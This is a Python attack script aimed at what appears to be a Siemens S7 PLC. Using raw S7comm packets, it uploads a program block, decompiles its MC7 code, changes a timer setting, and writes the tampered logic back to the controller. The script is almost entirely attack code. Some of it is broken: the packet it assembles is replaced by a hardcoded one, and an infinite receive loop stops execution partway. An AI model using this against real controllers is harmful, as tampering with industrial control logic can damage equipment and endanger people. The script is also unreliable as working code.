import socket
import binascii
from openpyxl import load_workbook

print("Server is starting")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.20.199', 102))

cotp = '0300001611e00000004700c1020100c2020102c0010a'
communication_setup = '0300001902F08032010000020000080000F0000001000101e0'

upload_request = '0300002302F08032010000C300001200001D00000000000000095F3038303030303141'
upload = '0300001902F08032010000C400000800001E00000000000007'
upload_end = '0300001902F08032010000C500000800001F00000000000007'

download_request = '0300003102F080320100006B00002000001A00010000000000095F30383030303031500D31303030313834303030303738'
pdownload = ['0300****', '02F080','3203000005000002****00001B00',
             '6500010000140000000205020502050205020502050505050505050E052001002200000000000000000000000000000000000000000000000000000001000E700000000000000000']
download_end = '0300001402F080320300000F000001000000001C'
PI_service = '0300002b02f080320100006c00001a000028000000000000fd000a01003038303030303150055f494e5345'

def communicate():
    # cotp
    sock.send(binascii.a2b_hex(cotp))
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))
    # communication_setup
    sock.send(binascii.a2b_hex(communication_setup))
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))

def do_upload():
    # upload_request
    sock.send(binascii.a2b_hex(upload_request))
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))
    # upload
    sock.send(binascii.a2b_hex(upload))
    data = sock.recv(1024)
    print(binascii.b2a_hex(data))
    # upload_end
    sock.send(binascii.a2b_hex(upload_end))
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))
    return data

def analyse(data):
    # load mc7 code
    wb = load_workbook('mc7.xlsx')
    mc7 = wb["Sheet1"]
    k = 0
    offset = 2
    maxrow = 1854 - offset

    cotp_len = 7
    s7_header_len = 12
    s7_parameter_len = 2
    data = str(binascii.b2a_hex(data))
    data = data[(cotp_len + s7_header_len + s7_parameter_len) * 2 + 2:]

    code_len = 0
    codestart = code_len + 80
    codeend = data.find('6500')
    code = data[codestart: codeend]
    delopcode = {'0000': 'NOP 0', '0900': 'NEGI'}
    print("STL code:")
    instructions = {}
    while k < len(code):
        opcode = code[k:k + 4]
        instruction = ''
        for i in range(maxrow):
            if opcode in delopcode.keys():
                instruction = delopcode[opcode]
                break
            rindex = 'A' + str(i + offset)
            cindex = 'B' + str(i + offset)
            operator = mc7[rindex].value.replace(' ', '').lower()
            L = len(operator)
            if operator in delopcode.keys():
                continue
            descripion = mc7[cindex].value
            if opcode[:2] == operator[:2]:
                try:
                    temp = mc7[cindex].value.index('(')
                except ValueError:
                    temp = len(descripion)
                if L >= 8:
                    if opcode == operator[:4]:
                        opcode += code[k + 4:k + L]
                        instruction = descripion[:temp].replace('XXXX', str(int(opcode[4:8], 16)))
                        k = k + 4
                    else:
                        continue
                else:
                    instruction = descripion[:temp].replace('XX', str(int(opcode[2:4], 16)))
                if len(operator) >= 8:
                    break
        print(opcode + ' ' * (20 - L), end='')
        print(instruction)
        instructions[opcode] = instruction
        k = k + L - 4
    return instructions

def generate_code(instructions):
    instructions = list(instructions)
    for i in range(len(instructions)):
        # SD instruction configure the timer
        if '2400' in instructions[i]:
            print('Find Timer Instruction')
            # change the timer to 10s
            temp = instructions[i-1]
            temp = temp[0:4] + '11' + temp[6:]
            instructions[i-1] = temp
            break
    return ''.join(instructions)

def do_download(code, data):
    # download_request
    sock.send(binascii.a2b_hex(download_request))
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))

    # download packet construction
    cotp_len = 7
    s7_header_len = 12
    s7_parameter_len = 2
    data = str(binascii.b2a_hex(data))
    data = data[(cotp_len + s7_header_len + s7_parameter_len) * 2 + 2:]
    # data layer
    code_len = 0
    codestart = code_len + 80
    codeend = data.find('6500')
    data = data[0:codestart] + code + data[codeend:]
    # upper layer
    s7_hp = pdownload[2].replace("****", '00' + hex(int(len(data)/2))[2:])
    cotp = pdownload[0].replace("****",'00' + hex(int(len(data)/2) + 21)[2:])
    tpkt = pdownload[1]
    download = (cotp + tpkt + s7_hp + data).upper().strip('\'')
    # download
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))
    download = '030000A702F08032030000E9000002009200001B00008E00FB70700101020800010000008E000000000171093C324B03A1638321A7001C0006001400240010008800110088300C11002400001200883C00020053000C005301F800412000886500010000140000000205020502050205020502050505050505050E0520010022000000000000000000000000000000000000000000000000000000010010200000000000000000'
    sock.send(binascii.a2b_hex(download))
    # download_end
    while(True):
        ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))
    sock.send(binascii.a2b_hex(download_end))
    # PI-service
    sock.send(binascii.a2b_hex(download))
    ack = sock.recv(1024)
    print(binascii.b2a_hex(ack))

communicate()
data = do_upload()
result = analyse(data)
code = generate_code(result)
do_download(code, data)


